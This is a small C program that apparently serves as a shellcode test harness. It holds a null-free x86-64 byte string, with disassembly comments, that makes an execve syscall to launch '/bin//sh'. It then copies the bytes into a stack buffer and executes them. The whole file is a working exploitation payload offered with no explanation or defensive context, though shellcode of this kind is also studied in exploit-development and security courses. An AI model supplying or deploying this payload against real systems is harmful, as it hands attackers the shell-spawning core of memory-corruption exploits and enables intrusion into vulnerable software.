#include<stdio.h>
#include<stdlib.h>
#include<string.h>

const char code[] =
"\x48\x31\xc0"						//xor    %rax,%rax
"\x48\x31\xff"						//xor    %rdi,%rdi
"\x48\x31\xf6"						//xor    %rsi,%rsi
"\x48\x31\xd2"						//xor    %rdx,%rdx
"\x56"								//push   %rsi
"\x68\x2f\x62\x69\x6e"				//pushq  $0x6e69622f
"\xc7\x44\x24\x04\x2f\x2f\x73\x68"	//movl   $0x68732f2f,0x4(%rsp)
"\xb0\x3b"							//mov    $0x3b,%al
"\x48\x89\xe7"						//mov    %rsp,%rdi
"\x0f\x05"							//syscall 
;
int main( int argc, char *argv[]){

    char buf[sizeof(code)];
    strcpy(buf, code);
    ((void(*)( ))buf)( );

}
